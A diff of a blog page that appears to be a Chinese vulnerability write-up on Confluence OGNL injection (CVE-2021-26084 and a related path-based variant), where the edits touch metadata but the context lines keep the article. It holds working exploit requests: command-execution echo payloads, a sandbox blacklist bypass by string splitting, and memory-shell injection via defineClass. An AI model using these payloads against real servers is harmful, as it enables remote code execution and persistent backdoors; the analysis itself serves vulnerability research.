@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo">
-    <meta name="description" content="Confluence(CVE-2021-26084)本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。
-21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字">
+    <meta name="keywords" content="Confluence(CVE-2021-26084), Hexo">
+    <meta name="description" content="本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。
+21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用og">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +20,7 @@
 
     
 
-    <title>Hexo</title>
+    <title>Confluence(CVE-2021-26084) | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">Confluence(CVE-2021-26084)</h1>
                 </div>
             </div>
         </div>
@@ -437,6 +437,15 @@
                 </div>
                 <div class="col s5 right-align">
                     
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/JAVA/" class="post-category">
+                                JAVA
+                            </a>
+                        
+                    </div>
+                    
                 </div>
             </div>
 
@@ -444,7 +453,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-11-02
+                    2022-10-16
                 </div>
                 
 
@@ -468,7 +477,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Confluence-CVE-2021-26084"><a href="#Confluence-CVE-2021-26084" class="headerlink" title="Confluence(CVE-2021-26084)"></a>Confluence(CVE-2021-26084)</h1><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
+                <p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
 <p>21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用<code>ognl.getValue()</code>处理。confluence处理vm文件，首先将vm内容转为AST语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。而我们构造的payload中的queryString就是其中一个节点。</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
 Host: ty.com:8090
@@ -477,14 +486,14 @@ Content-Length: 47
 
 queryString&#x3D;%5Cu0027%2bClass%2b%5cu0027</code></pre>
 
-<p>![20221016205808](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016205808.png)</p>
+<p><img src="/Downloads/20221016205808.png"></p>
 <p>首先来看这个POC，等号后面的值就是最终会传入<code>ognl.getValue()</code>的参数。解码后为<code>/u0027+Class+/u0027</code>。来看看poc为什么这样构造，首先从返回的结果上来看，返回的是一个class对象。对应到poc中的Class，有点像spring4shell那个洞的解析方式。表达式的本意是获取root中存放对象的class属性，从而会使其调用从Object继承而来的getClass方法来获取class属性，最终返回给我们。理解这点非常重要，因为后期要构造的Class.forName()中的Class并非<code>java.lang.Class</code>而是上面回显出的这个Class对象。</p>
 <p>下一个问题，为什么要构造<code>/u0027+...+/u0027</code>呢？首先我们要知道，&#x2F;u0027是单引号的unicode编码，实际上，payload可看成<code>&#39;+...+&#39;</code>，这种形式的payload基本不难猜出是为了闭合前后已经存在的单引号。</p>
-<p>![20221016212423](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016212423.png)</p>
-<p>事实也的确如此，那么为什么要以unicode编码的形式去添加单引号而不是直接用<code>&#39;</code>呢？我们先来看看使用<code>&#39;</code>会是什么效果。<br>![20221016213810](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016213810.png)</p>
+<p><img src="/Downloads/20221016212423.png"></p>
+<p>事实也的确如此，那么为什么要以unicode编码的形式去添加单引号而不是直接用<code>&#39;</code>呢？我们先来看看使用<code>&#39;</code>会是什么效果。<br><img src="/Downloads/20221016213810.png"></p>
 <p>可以看到这里的单引号被实体编码了，具体哪个位置编码的我们不去深究。实际上，Ognl表达式并不能解析实体编码，但可以正常处理unicode编码的单引号<code>\u0027</code>，所以可以用unicode编码替代。</p>
 <p>对于一个测试poc的分析到这里已经可以结束了。但要是想深度利用这个漏洞，还需要了解它的黑名单机制。</p>
-<p>![20221016214843](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016214843.png)</p>
+<p><img src="/Downloads/20221016214843.png"></p>
 <p>在真正的去计算Ognl表达式前，会调用静态方法<code>SafeExpressionUtil.isSafeExpression</code>对编译后的结果进行安全检查。一共包括四个方面：</p>
 <ol>
 <li>第一个hashset限制了构造函数的关键字：new，静态方法调用：@符号</li>
@@ -528,7 +537,7 @@ Content-Length: 0</code></pre>
 <pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;,org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;));&quot;)&#125;&#x2F;</code></pre>
 
 <p>一定不要忘了最后的的斜杠，因为系统获取payload的方法是<code>lastIndexOf(&quot;/&quot;)</code>，这个版本的触发点和21版的很相似，都在OgnlValueStack的findValue方法中。但比起21的洞来说，这版少了黑名单的限制，也无需闭合单引号以及对引号做转码处理（毕竟两个洞的成因和触发流程不同）。但除此之外，我们对payload进行了${}的处理。这点可以看到源码</p>
-<p>![20221016164016](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016164016.png)</p>
+<p><img src="/Downloads/20221016164016.png"></p>
 <p>在将payload传入findValue方法前做了一个正则匹配处理。这里要注意一点的是，由于这个正则的存在，所以我们的payload中<code>$&#123;&#125;</code>里的内容中不能含有<code>&#125;</code>，否则这个<code>&#125;</code>会直接去匹配前面的<code>&#123;</code>，导致payload被截断，无法正常执行。</p>
 <h3 id="内存马-1"><a href="#内存马-1" class="headerlink" title="内存马"></a>内存马</h3><p>Confluence本身有spring的依赖，所以可以选择直接通过调用<code>org.springframework.cglib.core.ReflectUtils.defineClass</code>加载字节码来打入内存马</p>
 <pre class="language-none"><code class="language-none">POST &#x2F;%24%7B%40org.springframework.cglib.core.ReflectUtils%40defineClass(&#39;Memshell&#39;%2C%40org.springframework.util.Base64Utils%40decodeFromString(%40com.opensymphony.xwork.ActionContext%40getContext().getParameters().get(&#39;code&#39;))%2Cnew%20javax.management.loading.MLet(new%20java.net.URL%5B0%5D%2C%40java.lang.Thread%40currentThread().getContextClassLoader()))%7D&#x2F; HTTP&#x2F;1.1
@@ -547,12 +556,12 @@ code&#x3D;yv66vgAA</code></pre>
 <pre class="language-none"><code class="language-none">&#x2F;$&#123;@org.springframework.cglib.core.ReflectUtils@defineClass(&#39;Memshell&#39;,@org.springframework.util.Base64Utils@decodeFromString(@com.opensymphony.xwork.ActionContext@getContext().getParameters().get(&#39;code&#39;)),new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))&#125;&#x2F;</code></pre>
 
 <h2 id="沙箱版"><a href="#沙箱版" class="headerlink" title="沙箱版"></a>沙箱版</h2><p>从7.15版本开始，Confluence在OGNL表达式解析时加入了沙箱设置。沙箱存在于xwork的jar包中。我们diff一下两个版本的jar包进行观察。</p>
-<p>![20221016165046](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016165046.png)</p>
+<p><img src="/Downloads/20221016165046.png"></p>
 <p>可以明显观察到这里多了一个SafeExpressionUtil.class。再对比一下<code>findValue</code>方法的执行点</p>
-<p>![20221016165435](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016165435.png)</p>
+<p><img src="/Downloads/20221016165435.png"></p>
 <p>在执行<code>findValue</code>方法前也是多了一个表达式安全的判断。</p>
 <p>我们看到这个中，主要的表达式安全判别代码如下图所示</p>
-<p>![20221016170429](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016170429.png)</p>
+<p><img src="/Downloads/20221016170429.png"></p>
 <p>配合系统中的黑名单和白名单一起判别。</p>
 <p>黑名单</p>
 <pre class="language-none"><code class="language-none">sun.misc.Unsafe
@@ -685,14 +694,14 @@ java.io.Serializable</code></pre>
 
 <p>看起来感觉很苛刻，因为我们通用的构成RCE的点全部进了黑名单。白名单里也没什么乍一看就可以直接利用的点。</p>
 <p>首先我们看到白名单的处理，在上面的代码中，只有一个地方用到了白名单</p>
-<p>![20221016171436](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016171436.png)</p>
+<p><img src="/Downloads/20221016171436.png"></p>
 <p>也就是调用静态方法时。所以尽管我们需要用到的一些类和方法不在白名单中，只要不通过<code>@</code>去调用静态方法(比如在scriptEngine的eval中去调用)，就可以绕过白名单。而对于<code>Class.forName</code>来说，尽管forName是一个静态方法。和之前一样，这里的<code>Class</code>并非<code>java.lang.Class</code>，而是上下文中root中对象所对应的class对象。这里就是用一个对象去调用静态方法，ognl的节点类型给的是<code>ognl.ASTMethod</code>（盲猜底层是通过<code>@</code>判断是否为静态方法）</p>
-<p>![20221016173701](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016173701.png)</p>
+<p><img src="/Downloads/20221016173701.png"></p>
 <p>所以成功绕过白名单，而黑名单中也没有<code>Class</code>，所以这点顺利过关。</p>
 <p>然后就是黑名单了，即便我们可以在scriptEngine的eval中去执行代码来避免白名单对静态方法的过滤。但是scriptEngine却赫然位于黑名单中，我们不妨看看黑名单过滤是怎么做的</p>
-<p>![20221016174924](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016174924.png)</p>
+<p><img src="/Downloads/20221016174924.png"></p>
 <p>直接用contains方法去匹配传入的表达式节点。这里可以用<code>+</code>进行一个绕过，因为这样可以在不影响执行结果的情况下改变传入的表达式节点。</p>
-<p>![20221016175435](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016175435.png)</p>
+<p><img src="/Downloads/20221016175435.png"></p>
 <h3 id="回显POC-2"><a href="#回显POC-2" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
 Host: localhost:8091
 cmd: whoami
@@ -726,7 +735,7 @@ code&#x3D;yv66vg...</code></pre>
 <pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;jav&quot;+&quot;ax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;org.springframework.cglib.core.ReflectUtils.defineClass(&#39;Memshell&#39;,org.springframework.util.Base64Utils.decodeFromString(com.opensymphony.xwork.ActionContext.getContext().getParameters().get(&#39;code&#39;)[0]),java.lang.Thread.currentThread().getContextClassLoader());&quot;)&#125;&#x2F;</code></pre>
 
 <p>这里还需要注意一个小问题，这个内存马对比之前的有个小缺陷。那就是会受到类重复加载问题的影响，从代码中可以看出来，原始版本中的内存马的类加载器对象是new出来的，每打一次就会重新new一个新的类加载器对象出来，所以不会受到影响。而这个版本的内存马用的类加载器对象是当前线程的类加载器对象，每次打的时候用的都是这同一个类加载器对象，所以会受到类重复加载问题影响，那么为什么这版的内存马不能那么写呢？因为在new <code>javax.management.loading.MLet</code>时需要传入一个java.net.UTL[]类型的参数，这个参数是需要new出来的，而scriptEngine的eval中无法new出来数组对象，否则就会报错。</p>
-<p>![20221016181705](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016181705.png)</p>
+<p><img src="/Downloads/20221016181705.png"></p>
 <h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253398#h3-4">CVE-2021-26084：Confluence Webwork Ognl表达式注入漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
 
                 
@@ -754,7 +763,7 @@ code&#x3D;yv66vg...</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/11/02/Confluence/">http://example.com/2022/11/02/Confluence/</a>
+                    <a href="http://example.com/2022/10/16/Confluence/">http://example.com/2022/10/16/Confluence/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -968,13 +977,13 @@ code&#x3D;yv66vg...</code></pre>
                 <i class="far fa-dot-circle"></i>&nbsp;Current
             </div>
             <div class="card">
-                <a href="/2022/11/02/Confluence/">
+                <a href="/2022/10/16/Confluence/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Confluence(CVE-2021-26084)">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Confluence(CVE-2021-26084)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -985,12 +994,16 @@ code&#x3D;yv66vg...</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-16
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Icesoul
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/JAVA/" class="post-category">
+                                    JAVA
+                                </a>
+                            
                             
                         </span>
                     </div>
